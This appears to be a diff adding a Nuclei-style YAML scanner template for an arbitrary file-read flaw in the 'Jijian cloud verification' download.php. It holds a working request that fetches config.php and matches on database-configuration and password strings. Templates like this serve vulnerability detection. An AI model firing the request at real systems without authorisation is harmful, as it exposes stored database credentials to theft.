@@ -1,0 +1,25 @@
+id: poc-yaml-simpleauth-download-fileread
+info:
+  name: 极简云验证 download.php 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/download.php?file=20b6cb088a8d5c444074&filename=config.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "数据库配置"
+          - "$dbconfig=array"
+          - "'pwd'"
+      - type: word
+        part: header
+        words:
+          - "application/force-download"
